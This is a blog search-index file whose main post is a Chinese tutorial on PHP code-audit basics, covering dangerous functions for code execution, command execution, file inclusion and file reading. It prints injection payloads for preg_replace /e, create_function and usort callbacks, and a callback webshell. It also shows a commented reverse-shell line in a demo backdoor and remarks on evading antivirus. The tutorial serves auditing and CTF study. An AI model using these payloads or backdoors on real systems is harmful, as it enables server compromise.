[{"title":"序言","url":"/2024/11/20/hello-world/","content":"网络安全是一个需要长期积累的行业，更多的是碎片化的内容。\n故做了这么个网站，将一些文章发出来，互相学习共勉！\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"PHP代码审计基础","url":"/2024/11/23/001/","content":"前言本文章主要是PHP代码审计的一些基础知识，包括函数的用法，漏洞点，偏向基础部分，个人能力有限，部分可能会出现错误或者遗漏，读者可自行补充。\n代码执行代码执行是代码审计当中较为严重的漏洞，主要是一些命令执行函数的不适当使用。那么，常见的能够触发这类漏洞的函数有哪些呢？\neval()想必大家对eval()函数应该并不陌生，简而言之eval()函数就是将传入的字符串当作 PHP 代码来进行执行。\neval( string $code) : mixed\n\n返回值eval() 返回 NULL，除非在执行的代码中 return了一个值，函数返回传递给 return的值。PHP7开始，执行的代码里如果有一个parse error，eval() 会抛出 ParseError 异常。在 PHP 7 之前，如果在执行的代码中有 parse error，eval() 返回FALSE，之后的代码将正常执行。无法使用set_error_handler()捕获 eval() 中的解析错误。\n也就是说，我们在利用eval()函数的时候，如果我们传入的字符串不是正常的代码格式，那么就会抛出异常。所以PHP7和PHP5在这部分最大的不同是什么呢？简而言之，PHP5在代码错误格式错误之后仍会执行，而PHP7在代码发生错误之后，那么eval()函数就会抛出异常，而不执行之后的代码。\n示例：\n&lt;?php    $code = &quot;echo &#x27;This is a PHP7&#x27;;&quot;;    eval($code);?&gt;执行结果——&gt;This is a PHP7\n\n那么如果我要执行系统命令呢？这个时候就需要用到PHP中的system函数。\n&lt;?php    $code = &quot;system(&#x27;whoami&#x27;);&quot;;    eval($code);?&gt;执行结果——&gt;desktop-m61j5j6\\admin\n\n那么到此，我们就可以结合其他姿势通过这个函数实现任意代码执行了。\nassert()PHP 5\nassert( mixed $assertion[, string $description] ) : bool\n\nPHP 7\nassert( mixed $assertion[, Throwable $exception] ) : bool\n\n参数\nassertion\n\n断言。在PHP 5 中，是一个用于执行的字符串或者用于测试的布尔值。在PHP 7 中，可以是一个返回任何值的表达式，它将被执行结果用于判断断言是否成功。\n\ndescription\n\n如果assertion失败了，选项description将会包含在失败信息里。\n\nexception\n\n在PHP 7中，第二个参数可以是一个Throwable对象，而不是一个字符串，如果断言失败且启用了assert.exception，那么该对象将被抛出\nassert()配置\n\n\n配置项\n默认值\n可选值\n\n\n\nzend.assertions\n1\n1 - 生成和执行代码(开发模式) 0 - 生成代码，但在执行时跳过它 -1 - 不生成代码(生产环境)\n\n\nassert.exception\n0\n1 - 断言失败时抛出，可以抛出异常对象，如果没有提供异常，则抛出AssertionError对象实例 0 - 使用或生成Throwable，仅仅是基于对象生成的警告而不是抛出对象(与PHP 5 兼容)\n\n\n所以搞了这么多，assert()函数到底是干什么的呢？用我的理解来说，assert()函数是处理异常的一种形式，相当于一个if条件语句的宏定义一样。\n一个PHP 7 中的示例\n&lt;?php    assert_options(ASSERT_EXCEPTION, 1);    // 设置在断言失败时产生异常    try &#123;        assert(1 == 2, new AssertionError(&#x27;因为1不等于2，所以前面断言失败，抛出异常&#x27;));  // 用 AssertionError 异常替代普通字符串    &#125; catch (Throwable $error) &#123;        echo $error-&gt;getMessage();    &#125;?&gt;执行结果——&gt;因为1不等于2，所以前面断言失败，抛出异常\n\n这里就是实例化一个对象，用这个对象来抛出异常。\n一个php 5 中的示例\n&lt;?php    assert(1 == 2,&#x27;前面断言失败，抛出异常&#x27;);?&gt;执行结果——&gt;Warning: assert(): 前面断言失败，抛出异常 failed in D:\\phpstudy_pro\\WWW\\1.php on line 2&lt;?php    assert(1 == 2);?&gt;执行结果——&gt;Warning: assert(): Assertion failed in D:\\phpstudy_pro\\WWW\\1.php on line 2\n\n所以PHP 7 相较于PHP 5 就是多了个用Throwable来发出警告。\n那么，如果前面断言成功呢？会发生什么呢?来个最简单，也是我们比较喜欢的示例\n&lt;?php    $code = &quot;system(whoami)&quot;    assert($code);?&gt;执行结果——&gt;desktop-m61j5j6\\admin\n\n这段代码在PHP 5 和PHP 7 中都会返回命令执行结果，虽然PHP 7 中对断言函数的参数稍作了改变，但是为了兼容低版本，所以还是会直接返回结果。\npreg_replace()通过函数名字我们也应该能够了解函数大概作用，此函数执行一个正则表达式的搜索和替换。\nmixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )\n\n搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。\n参数说明：\n$pattern: 要搜索的模式，可以是字符串或一个字符串数组。\n$replacement: 用于替换的字符串或字符串数组。\n$subject: 要搜索替换的目标字符串或字符串数组。\n$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。\n$count: 可选，为替换执行的次数。\n\n那这个函数跟我们命令执行有什么关系呢？仅仅看上面的官方解释似乎看不出什么，但是preg_repace()有一个模式是&#x2F;e模式，这个模式就会发生代码执行的问题，为什么呢？\n看一个案例\n&lt;?php     function Ameng($regex, $value)&#123;        return preg_replace(&#x27;/(&#x27; . $regex . &#x27;)/ei&#x27;, &#x27;strtolower(&quot;\\\\1&quot;)&#x27;, $value);    &#125;    foreach ($_GET as $regex =&gt; $value)&#123;        echo Ameng($regex, $value) . &quot;\\n&quot;;    &#125;?&gt;\n\n上面这段我们需要注意的就是\\1,\\1在正则表达式是反向引用的意思，简而言之就是指定一个子匹配项。\n针对上面案例，我们来个payload：\npayload=/?.*=&#123;$&#123;phpinfo()&#125;&#125;所以语句就成了这样preg_replace(&#x27;/(.*)/ei&#x27;, &#x27;strtolower(&quot;\\\\1&quot;)&#x27;, &#123;$&#123;phpinfo()&#125;&#125;);\n\n那么我们直接把这段代码放到页面\n&lt;?php    preg_replace(&#x27;/(.*)/ei&#x27;, &#x27;strtolower(&quot;\\\\1&quot;)&#x27;, &#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;);?&gt;\n\n访问页面，结果如下：\n\n我们看到成功执行了代码。\n但是这里我是直接将这段代码写到了文件里，那么如果我们是通过GET传参得到参数，这里针对上面那个案例就需要注意一点，在通过GET传参时，.*会被替换为_*导致我们要的正则被替换了，达不到我们的效果，所以这里可用使用一些其他的正则表达式来达到目的，比如通过GET传参时我们的参数可以传入\\S*从而达到同样目的。所以以后再遇到这个函数的时候，要留个心眼了。不过，这里要补充一点，就是preg_replace()函数在PHP 7 后便不再支持，使用preg_replace_callback()进行替换了，取消了不安全的\\e模式。\ncreate_function()create_function()用来创建一个匿名函数\ncreate_function( string $args, string $code) : string\n\n参数\nstring $args 声明的函数变量部分\nstring $code 要执行的代码\n\n返回值返回唯一的函数名称作为字符串或者返回FALSE错误\ncreate_function()函数在内部执行eval()函数，所以我们就可以利用这一点，来执行代码。当然正因为存在安全问题，所以在PHP 7.2 之后的版本中已经废弃了create_function()函数，使用匿名函数来代替。所以这里为了演示这个函数，我采用的是PHP 5 的环境。那么这个函数到底怎么用呢？\n那么来看我写的一个简单的案例\n&lt;?php    $onefunc = create_function(&#x27;$a&#x27;,&#x27;return system($a);&#x27;);    $onefunc(whoami);?&gt;执行结果——&gt;desktop-m61j5j6\\admin\n\n我们看到使用此函数为我们相当于创造了一个匿名的函数，给它赋以相应的变量，就执行了我们要执行的代码。\n那么接下来我们来看一个简单的案例\n&lt;?php    error_reporting(0);    $sort_by = $_GET[&#x27;sort_by&#x27;];    $sorter = &#x27;strnatcasecmp&#x27;;    $databases=array(&#x27;1234&#x27;,&#x27;4321&#x27;);    $sort_function = &#x27; return 1 * &#x27; . $sorter . &#x27;($a[&quot;&#x27; . $sort_by . &#x27;&quot;], $b[&quot;&#x27; . $sort_by . &#x27;&quot;]);&#x27;;    usort($databases, create_function(&#x27;$a, $b&#x27;, $sort_function));?&gt;\n\n这个主要功能就是实现排序，这段代码就调用了create_function()函数，那么我们能否利用这个函数执行我们想要执行的代码呢？\n当然可以，我们只需要在传参时将前面的符号闭合，然后输入我们想要执行的代码即可。\npayload=&#x27;&quot;]);&#125;phpinfo();/*执行payload前：$sort_function = &#x27; return 1 * &#x27; . $sorter . &#x27;($a[&quot;&#x27; . $sort_by . &#x27;&quot;], $b[&quot;&#x27; . $sort_by . &#x27;&quot;]);&#x27;;执行payloda后：$sort_function = &#x27; return 1 * &#x27; . $sorter . &#x27;($a[&quot;&#x27; . $sort_by &#x27;&quot;]);&#125;phpinfo();/*\n\n看到这里，你可能会有稍微疑惑，就是你闭合就闭合吧，为什么后面多了个;&#125;，不知道你是否想到了这一点？\n那么我就来分析一下这个，上面的那段执行代码，实际上就是一个匿名函数的创建，既然是一个函数，注意是一个函数，那么你觉得有没有花括号呢？看我如下代码\n&lt;?php    //未闭合之前    function sort($a,$b)&#123;    &#x27; return 1 * &#x27; . $sorter . &#x27;($a[&quot;&#x27; . $sort_by . &#x27;&quot;], $b[&quot;&#x27; . $sort_by . &#x27;&quot;]);&#x27;;    &#125;    //闭合之后    function sort($a,$b)&#123;        &#x27; return 1 * &#x27; . $sorter . &#x27;($a[&quot;&#x27; . $sort_by &#x27;&quot;]);    &#125;        phpinfo();/*    &#125;?&gt;\n\n可以看到，我们借用了匿名函数的位置，插入了我们要执行的代码，然后等这个匿名函数被create_function当作$code执行的时候，是不是代码就被执行了。\n结果：\n\n那么creat_function函数还有别的用法吗？我们将上面一个案例简单的修改一下，代码如下：\n&lt;?php    $onefunc = create_function(&quot;&quot;,&quot;die(`cat flag.php`)&quot;);    $_GET[&#x27;func_name&#x27;]();    die();?&gt;\n\n代码简单的来看，我们只需要执行$onefunc就能得到flag，但是我们不知道这个函数的名称。如果在不知道函数名称的情况下执行函数呢？这里就用到了creat_function函数的一个漏洞。这个函数在creat之后会自动生成一个函数名为%00lambda_%d的匿名函数。%d的值是一直递增的，会一直递增到最大长度直到结束。所以这里可以通过多进程或者多线程访问，从而看到flag。\n所以，以后再代码中如果看到调用create_function()要小心一点，但是如果是CTF题目的话，不会这么直接就吧这个函数暴露给你，它可能会用到拼接或者替换来构造这个函数。最后再强调一下，create_function函数在PHP 7.2 版本之后就已经被废弃了。\narray_map()array_map()为数组的每个元素应用回调函数\narray_map( callable $callback, array $array1[, array $...] ) : array\n\n**array_map()**：返回数组，是为 array1 每个元素应用 callback函数之后的数组。callback 函数形参的数量和传给array_map() 数组数量，两者必须一样。\n参数\ncallback：回调函数，应用到每个数组里的每个元素。\narray1：数组，遍历运行callback函数。\n…：数组列表，每个都遍历运行callback函数。\n\n返回值返回数组，包含callback函数处理之后array1的所有元素。\n说了这么多官方的函数解释，那么这个函数到底如何使用呢？简而言之，这个函数的作用可以这么直白的解释一下。你本来有一个数组，然后我通过array_map函数将你这个数组当作参数传入，然后返回一个新的数组。见下图。\n\n代码示例：\n&lt;?php    $old_array = array(1, 2, 3, 4, 5);    function func($arg)&#123;        return $arg * $arg;    &#125;    $new_array = array_map(&#x27;func&#x27;,$old_array);    var_dump($new_array);?&gt;执行结果——&gt;array(5) &#123;  [0]=&gt;  int(1)  [1]=&gt;  int(4)  [2]=&gt;  int(9)  [3]=&gt;  int(16)  [4]=&gt;  int(25)&#125;\n\n通过上述代码，我们大概知道这个函数就是调用回调函数（用户自定义的函数）来实现对现有数组的操作，从而得到一个新的数组。\n那么功能我知道了，可是这个和代码执行有什么关系呢？如何能够利用这个函数执行代码呢？且看下面所示代码。\n&lt;?php    $func = &#x27;system&#x27;;    $cmd = &#x27;whoami&#x27;;    $old_array[0] = $cmd;    $new_array = array_map($func,$old_array);    var_dump($new_array);?&gt;执行结果——&gt;desktop-m61j5j6\\adminarray(1) &#123;  [0]=&gt;  string(21) &quot;desktop-m61j5j6\\admin&quot;&#125;\n\n这段代码就是，通过array_map()这个函数，来调用用户自定义的函数，而用户这里的回调函数其实就是system函数，那么就相当于我们用system函数来对旧数组进行操作，得到新的数组，那么这个新的数组的结果就是我们想要的命令执行的结果了。\ncall_user_func()call_user_func()是把第一个参数作为回调函数调用\ncall_user_func( callable $callback[, mixed $parameter[, mixed $...]] ) : mixed\n\n参数 #第一个参数callback是被调用的回调函数，其余参数是回调函数的参数。\n\ncallback：即将被调用的回调函数\nparameter：传入回调函数的参数\n\n这个函数还是非常好理解的，看一段简单的示例代码\n&lt;?php    function callback($a,$b)&#123;        echo $a . &quot;\\n&quot;;        echo $b;    &#125;    call_user_func(&#x27;callback&#x27;,&#x27;我是参数1&#x27;,&#x27;我是参数2&#x27;);?&gt;执行结果——&gt;我是参数1我是参数2\n\n可以看到此函数作用就是调用了笔者自定义的函数。那么这个如何实现代码执行呢？好说，你在前面自定义的函数中加入能执行命令的代码不久可以代码执行了。\n示例代码：\n&lt;?php    function callback($a)&#123;        return system($a);    &#125;    $cmd = &#x27;whoami&#x27;;    call_user_func(&#x27;callback&#x27;,$cmd);?&gt;执行结果——&gt;desktop-m61j5j6\\admin\n\ncall_user_func_array() #这个函数名称跟上没什么大的差别，唯一的区别就在于参数的传递上，这个函数是把一个数组作为回调函数的参数\ncall_user_func_array( callable $callback, array $param_arr) : mixed\n\n参数 #\ncallback：被调用的回调函数\nparam_arr：要被传入回调函数的数组，这个数组需要是索引数组\n\n示例代码\n&lt;?php    function callback($a,$b)&#123;        echo $a . &quot;\\n&quot;;        echo $b;    &#125;    $onearray = array(&#x27;我是参数1&#x27;,&#x27;我是参数2&#x27;);    call_user_func_array(&#x27;callback&#x27;,$onearray);?&gt;执行结果——&gt;我是参数1我是参数2\n\n示例代码：\n&lt;?php    function callback($a)&#123;        return system($a);    &#125;    $cmd = array(&#x27;whoami&#x27;);    call_user_func_array(&#x27;callback&#x27;,$cmd);?&gt;执行结果——&gt;desktop-m61j5j6\\admin\n\narray_filter() #用回调函数过滤数数组中的单元\narray_filter( array $array[, callable $callback[, int $flag = 0]] ) : array\n\n依次将array数组中的每个值传到callback函数。如果callback函数返回true，则array数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。\n参数 #\narray：要循环的数组\ncallback：使用的回调函数。如果没有提供callback函数，将删除array中所有等值为FALSE的条目。\nflag：决定callback接收的参数形式\n\n代码示例（这里看官方的就行，很详细）：\n&lt;?phpfunction odd($var)&#123;    // returns whether the input integer is odd    return($var &amp; 1);&#125;function even($var)&#123;    // returns whether the input integer is even    return(!($var &amp; 1));&#125;$array1 = array(&quot;a&quot;=&gt;1, &quot;b&quot;=&gt;2, &quot;c&quot;=&gt;3, &quot;d&quot;=&gt;4, &quot;e&quot;=&gt;5);$array2 = array(6, 7, 8, 9, 10, 11, 12);echo &quot;Odd :\\n&quot;;print_r(array_filter($array1, &quot;odd&quot;));echo &quot;Even:\\n&quot;;print_r(array_filter($array2, &quot;even&quot;));?&gt; 执行结果——&gt;Odd :Array(    [a] =&gt; 1    [c] =&gt; 3    [e] =&gt; 5)Even:Array(    [0] =&gt; 6    [2] =&gt; 8    [4] =&gt; 10    [6] =&gt; 12)\n\n从上面代码我们知道，这个函数作用其实就是过滤，只不过这个过滤调用的是函数，而被过滤的是传入的参数。到这里你心里有没有代码执行的雏形了？\n代码示例：\n&lt;?php    $cmd=&#x27;whoami&#x27;;    $array1=array($cmd);    $func =&#x27;system&#x27;;    array_filter($array1,$func);?&gt;执行结果——&gt;desktop-m61j5j6\\admin\n\nusort() #使用用户自定义的比较函数对数组中的值进行排序\nusort( array &amp;$array, callable $value_compare_func) : bool\n\n参数 #\narray：输入的数组\ncmp_function：在第一个参数小于、等于或大于第二个参数时，该比较函数必须相应地返回一个小于、等于或大于0的数\n\n代码示例：\n&lt;?php    function func($a,$b)&#123;        return ($a&lt;$b)?1:-1;    &#125;    $onearray=array(1,3,2,5,9);    usort($onearray, &#x27;func&#x27;);    print_r($onearray);?&gt;执行结果——&gt;Array(    [0] =&gt; 9    [1] =&gt; 5    [2] =&gt; 3    [3] =&gt; 2    [4] =&gt; 1)\n\n可见实现了逆序的功能。那么倘若我们把回调函数设计成能够执行代码的函数，是不是就可以执行我们想要的代码了呢？\n代码示例：\n&lt;?php     usort(...$_GET);?&gt;payload: 1.php?1[0]=0&amp;1[1]=eval($_POST[&#x27;x&#x27;])&amp;2=assertPOST传参: x=phpinfo();\n\nusort的参数通过GET传参，第一个参数也就是$_GET[0]，随便传入一个数字即可。第二个参数也就是$_GET[1]是我们要调用的函数名称，这里采用的是assert函数。\n执行结果：\n\nuasort() #这个跟上一个差不多，区别不是很大。此函数对数组排序并保持索引和单元之间的关联。也就是说你这个排完序之后呢，它原来对应的索引也会相应改变，类似于“绑定”。\nuasort( array &amp;$array, callable $value_compare_func) : bool\n\n参数 #\narray：输入的数组\nvalue_compare_func：用户自定义的函数\n\n这里用的仍然官方例子（比较好理解）\n&lt;?php// Comparison functionfunction cmp($a, $b) &#123;    if ($a == $b) &#123;        return 0;    &#125;    return ($a &lt; $b) ? -1 : 1;&#125;// Array to be sorted$array = array(&#x27;a&#x27; =&gt; 4, &#x27;b&#x27; =&gt; 8, &#x27;c&#x27; =&gt; -1, &#x27;d&#x27; =&gt; -9, &#x27;e&#x27; =&gt; 2, &#x27;f&#x27; =&gt; 5, &#x27;g&#x27; =&gt; 3, &#x27;h&#x27; =&gt; -4);print_r($array);// Sort and print the resulting arrayuasort($array, &#x27;cmp&#x27;);print?&gt;执行结果——&gt;Array(    [a] =&gt; 4    [b] =&gt; 8    [c] =&gt; -1    [d] =&gt; -9    [e] =&gt; 2    [f] =&gt; 5    [g] =&gt; 3    [h] =&gt; -4)Array(    [d] =&gt; -9    [h] =&gt; -4    [c] =&gt; -1    [e] =&gt; 2    [g] =&gt; 3    [a] =&gt; 4    [f] =&gt; 5    [b] =&gt; 8)\n\n我们发现，在排完序之后索引也跟着值的位置变化而变化了。那么代码执行的示例代码其实也和上一个差不多。\n代码示例：\n&lt;?php    $a = $_GET[&#x27;a&#x27;];    $onearray = array(&#x27;Ameng&#x27;, $_POST[&#x27;x&#x27;]);    uasort($onearray, $a);?&gt;\n\n执行结果：\n\n总结 #看完这里不知道你对代码审计中的代码执行部分是否有另一种想法？我的想法就是这个是和后门联系在一起的。我们可以看到很多函数都具有构造执行命令的条件，而且其中很多函数也的确被用在后门中，特别像后面几个回调函数，在后门中更是常见。当然这些后门函数也早已被安全厂商盯住，所以大部分已经无法直接免杀，所以想要免杀就需要结合其他姿势，比如替换、拼接、加密等等。但是这些知识在CTF中还是比较容易出现的。\n命令执行 #说完代码执行，我们再来看看命令执行。常见的命令执行函数有哪些呢？\nsystem() #这个函数想必我们都是比较熟悉的，此函数就是执行外部指令，并且显示输出\nsystem( string $command[, int &amp;$return_var] ) : string\n\n参数 #\ncommand：必需。要执行的命令\nreturn_var：可选。若设置了这个参数，那么命令执行后的返回状态就会被放到这个变量中\n\n示例代码：\n&lt;?php    $cmd = &#x27;whoami&#x27;;    system($cmd);?&gt;执行结果——&gt;desktop-m61j5j6\\admin\n\nexec() #这个其实和上面system函数没有太大区别，都是执行外部程序指令，只不过这个函数多了一个参数，可以让我们把命令执行输出的结果保存到一个数组中。\nexec( string $command[, array &amp;$output[, int &amp;$return_var]] ) : string\n\n参数 #\ncommand：必需。要执行的命令\noutput：可选。如果设置了此参数，那么命令执行的结果将会保存到此数组。\nreturn_var：可选。命令执行的返回状态。\n\n&lt;?php$cmd = &#x27;whoami&#x27;;echo exec($cmd);?&gt;执行结果——&gt;desktop-m61j5j6\\admin\n\nshell_exec() #此函数通过shell环境执行命令，并且将完整的输出以字符串的方式返回。如果执行过程中发生错误或者进程不产生输出，那么就返回NULL\nshell_exec( string $cmd) : string\n\n参数 #\ncmd：要执行的命令\n\n代码示例：\n&lt;?php$cmd = &#x27;whoami&#x27;;echo shell_exec($cmd);?&gt;执行结果——&gt;desktop-m61j5j6\\admin\n\npassthru() #执行外部程序并且显示原始输出。既然我们已经有执行命令的函数了，那么这个函数我们什么时候会用到呢？当所执行的Unix命令输出二进制数据，并且需要直接传送到浏览器的时候，需要用此函数来替代exec()或system()函数\npassthru( string $command[, int &amp;$return_var] ) : void\n\n参数 #\ncommand：要执行的命令\nreturn_var：Unix命令的返回状态将被记录到此函数。\n\n代码示例：\n第一你可以这么写&lt;?php    passthru(&#x27;whoami&#x27;);    //直接将结果返回到页面?&gt;第二你可以这么写&lt;?php    passthru(&#x27;whoami&#x27;,$result);    //将结果返回到一个变量，然后通过输出变量值得到输出内容    echo $result;?&gt;\n\npcntl_exec() #在当前进程空间执行指定程序。关键点就在于进程空间，倘若我现在设定一个条件，你只有在某个子进程中才能读取phpinfo，那这个时候，我们就需要用到这个函数了。\npcntl_exec( string $path[, array $args[, array $envs]] ) : void\n\n参数 #\npath：path必须时可执行二进制文件路径或在一个文件第一行指定了一个可执行文件路径标头的脚本(比如文件第一行是#!&#x2F;usr&#x2F;local&#x2F;bin&#x2F;perl的perl脚本)\nargs：此参数是一个传递给程序的参数的字符串数组\nenvs：环境变量，这个想必大家都很熟悉，只不过这里强调一点，这里传入的是数组，数组格式是 key &#x3D;&gt; value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。\n\n示例代码：\n//father&lt;?php    pcntl_exec(&#x27;/usr/local/bin/php&#x27;, [&#x27;2.php&#x27;]);?&gt;\n\n//son&lt;?php    while(true)&#123;        echo &#x27;ok&#x27;;    &#125;?&gt;\n\npopen() #此函数使用command参数打开进程文件指针。如果出错，那么该函数就会返回FALSE。\npopen(command,mode)\n\n参数 #\ncommand：要执行的命令\nmode：必需。规定连接的模式\nr：只读\nw：只写（打开并清空已有文件或创建一个新文件）\n\n\n\n代码示例：\n&lt;?php    $file = popen(&quot;demo.txt&quot;,&quot;r&quot;);    pclose($file);?&gt;&lt;?php$file = popen(&quot;/bin/ls&quot;,&quot;r&quot;);//some code to be executedpclose($file);?&gt;\n\nproc_open() #此函数执行一个命令，并且打开用来输入或者输出的文件指针\nproc_open( string $cmd, array $descriptorspec, array &amp;$pipes[, string $cwd = NULL[, array $env = NULL[, array $other_options = NULL]]] ) \n\n此函数其实和popen函数类似，都是执行命令\n参数 #\ncmd：要执行的命令\ndescriptorspec：索引数组。数组中的键值表示描述符，元素值表示 PHP 如何将这些描述符传送至子进程。0 表示标准输入（stdin），1 表示标准输出（stdout），2 表示标准错误（stderr）。\npipes：将被置为索引数组，其中的元素是被执行程序创建的管道对应到PHP这一段的文件指针。\ncwd：要执行命令的初始工作目录。必需是绝对路径。此参数默认使用 NULL（表示当前 PHP 进程的工作目录）\nenv。要执行命令所使用的环境变量。此参数默认为 NULL（表示和当前 PHP 进程相同的环境变量）\nother_options：可选。附加选项\nsuppress_errors （仅用于 Windows 平台）：设置为 TRUE 表示抑制本函数产生的错误。\nbypass_shell （仅用于 Windows 平台）：设置为 TRUE 表示绕过 cmd.exe shell。\n\n\n\n说白了，其实就是执行命令，只不过其中多了一些选项，包括目录的，环境变量的等。\n示例代码：\n$descriptorspec = array(            0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),    //标准输入，子进程从此管道读取数据            1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),    //标准输出，子进程向此管道写入数据            2 =&gt; array(&quot;file&quot;, &quot;/opt/figli/php/error-output.txt&quot;,&quot;a&quot;)    //标准错误，写入到指定文件            );    $process = proc_open(&quot;ls -a&quot;, $descriptorspec, $pipes);    if(is_resource($process))&#123;        echo stream_get_contents($pipes[1]);        fclose($pipes[1]);        proc_close($process);    //在调用proc_close之前必须关闭所有管道    &#125;\n\n文件包含 #include() #include将会包含语句并执行指定文件\ninclude &#x27;filename&#x27;;\n\n关键点就在于执行指定文件，执行给了我们代码执行的机会。倘若此时我们构造了一个后门文件，需要在目标机器执行进行shell反弹，那么如果代码中有include而且没有进行过滤，那么我们就可以使用该函数来执行我们的后门函数。下面我来演示一下。\n示例代码(1.php)：\n&lt;?php    highlight_file(__FILE__);    $file = $_GET[&#x27;file&#x27;];    include $file;?&gt;\n\n示例代码(2.php)：\n&lt;?php    //这里可以使用PHP来反弹shell，我这里只是演示    //$sock=fsockopen(&quot;127.0.0.1&quot;,4444);exec(&quot;bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);    echo &#x27;&lt;br&gt;&lt;h1&gt;[*]backdoor is running!&lt;/h1&gt;&#x27;;?&gt;\n\n执行结果：\n\ninclude_once() #include_once与include没有太大区别，唯一的其区别已经在名称中体现了，就是相同的文件只包含一次。其他功能和include_once一样，只是增加对每个文件包含的次数。\nrequire() #require的实现和include功能几乎完全相同，那既然一样为什么还要多一个这样的函数呢？( 我也不知道)\n其实两者还是有点区别的，什么区别呢？这么说，如果你包含的文件的代码里面有错误，你觉得会发生什么？是继续执行包含的文件，还是停止执行呢？所以区别就在这里产生了。\nrequire在出错时会导致脚本终止，而include在出错时只是发生警告，脚本还是继续执行。\nrequire_once() #这个我觉得你看完上面的，应该就懂了。这两者关系和include与include_once的关系是一样的。\n总结 #文件包含有很多利用手段，其中在实际环境中，例如我们向服务器写入了后门，但是我们无法直接连接服务器，那么如果有文件包含函数，我们可以通过文件包含函数包含执行我们的后门函数，让服务器反弹连接我们。岂不美哉。\n文件读取(下载) #file_get_contents() #函数功能是将整个文件读入一个字符串\nfile_get_contents(path,include_path,context,start,max_length)\n\n参数 #\nfilename：要读取文件的名称。\ninclude_path：可选。如果也想在 include_path 中搜索文件，可以设置为1。\ncontext：可选。规定句柄的位置。\nstart：可选。规定文件中开始读取的位置。\nmax_length：可选。规定读取的字节数。\n\n代码示例：\n&lt;?php    echo file_get_contents(&#x27;demo.txt&#x27;);?&gt;执行结果——&gt;I am a demo text\n\nfopen() #此函数将打开一个文件或URL，如果 fopen() 失败，它将返回 FALSE 并附带错误信息。我们可以通过在函数名前面添加一个 @ 来隐藏错误输出。\nfopen(filename,mode,include_path,context)\n\n参数 #\nfilename：必需。要打开的文件或URL\nmode：必需。规定访问类型（例如只读，只写，读写方式等，方式的规定和其他语言的规定方式一致）\ninclude_path：可选。就是你可以指定搜索的路径位置，如果要指定的话，那么该参数要指定为1\ncontext：可选。规定句柄的环境。\n\n代码示例：\n&lt;?php    $file = fopen(&quot;demo.txt&quot;,&quot;rb&quot;);    $content = fread($file,1024);    echo $content;    fclose($file);?&gt;执行结果——&gt;I am a demo text\n\n这段代码中其实也包含了fread的用法。因为fread仅仅只是打开一个文件，要想读取还得需要用到fread来读取文件内容。\nfread() #这个函数刚才在上个函数中基本已经演示过了，就是读取文件内容。这里代码就不再演示了，简单介绍一下参数和用法。\nstring fread ( resource $handle , int $length )\n\n参数 #\nhandle：文件系统指针，是典型地由 fopen创建的resource。\nlength：必需。你要读取的最大字节数。\n\nfgets() #从打开的文件中读取一行\nfgets(file,length) \n\n参数 #\nfile：必需。规定要读取的文件。\nlength：可选。规定要读取的字节数。默认是1024字节。\n\n可以看出这个函数和之前的fread区别不是很大，只不过这个读取的是一行。\nfgetss() #这个函数跟上个没什么差别，也是从打开的文件中读取去一行，只不过过滤掉了 HTML 和 PHP 标签。\nfgetss(file,length,tags)\n\n参数 #\nfile：必需。要检查的文件。\nlength：可选。规定要读取的字节数，默认1024字节。\ntags：可选。哪些标记不去掉。\n\n代码示例：\n&lt;?php    $file = fopen(&quot;demo.html&quot;,&quot;r&quot;);    echo fgetss($file);    fclose($file);?&gt;demo.html代码&lt;h1&gt;I am a demo&lt;/h1&gt;执行结果——&gt;I am a demo\n\nreadfile() #这个函数从名称基本就知道它是干啥的了，读文件用的。此函数将读取一个文件，并写入到输出缓冲中。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息。\nreadfile(filename,include_path,context)\n\n参数 #\nfilename：必需。要读取的文件。\ninclude_path：可选。规定要搜索的路径。\ncontext：可选。规定文件句柄环境。\n\n代码示例：\n&lt;?php    echo &quot;&lt;br&gt;&quot; . readfile(&quot;demo.txt&quot;);?&gt;执行结果——&gt;I am a demo:) I am a demo:(28\n\n我们看到不仅输出了所有内容，而且还输出了总共长度。但是没有输出换行。\nfile() #把文件读入到一个数组中，数组中每一个元素对应的是文件中的一行，包括换行符。\nfile(path,include_path,context)\n\n参数 #\npath：必需。要读取的文件。\ninclude_path：可选。可指定搜索路径。\ncontext：可选。设置句柄环境。\n\n代码示例：\n&lt;?phpprint_r(file(&quot;demo.txt&quot;));?&gt;执行结果——&gt;Array ( [0] =&gt; I am the first line! [1] =&gt; I am the second line! )\n\nparse_ini_file() #从名称可以看出，这个函数不是读取一个简单的文件。它的功能是解析一个配置文件(ini文件)，并以数组的形式返回其中的位置。\nparse_ini_file(file,process_sections)\n\n参数 #\nfile：必需。要读取的ini文件\nprocess_sections：可选。若为TRUE，则返回一个多维数组，包括了详细信息\n\n代码示例：\n&lt;?php    print_r(parse_ini_file(&quot;demo.ini&quot;));?&gt;demo.ini内容：[names]me = Robertyou = Peter[urls]first = &quot;http://www.example.com&quot;second = &quot;https://www.runoob.com&quot;执行结果——&gt;Array ( [me] =&gt; Robert [you] =&gt; Peter [first] =&gt; http://www.example1.com [second] =&gt; https://www.example2.com )\n\nshow_source()&#x2F;highlight_file() #这两个函数没什么好说的，想必大家也经常见到这两个函数，其作用就是让php代码显示在页面上。这两个没有任何区别，show_source其实就是highlight_file的别名。\n总结 #文件读取这块内容没什么好说的，不难，大多只是基本的应用。重点文件读取如果没有设置权限和过滤参数，那就问题大了，我们就可以任意文件读取了。\n补充：什么是句柄？\n开局先给一段代码\n$file = fopen(&quot;demo.txt&quot;,&quot;rb&quot;);\n\n在这段代码中$file就是一个句柄。句柄关键点在“柄”，后面的fopen是一个资源，好比一口锅，而前面的$file就好比这个锅的把手。那么以后我们在操作的时候操作把手就行了。通过这个把手我们可以间接操作比较大的资源。其实也类似C语言中的指针，只是一个标识。\n文件上传 #move_uploaded_file() 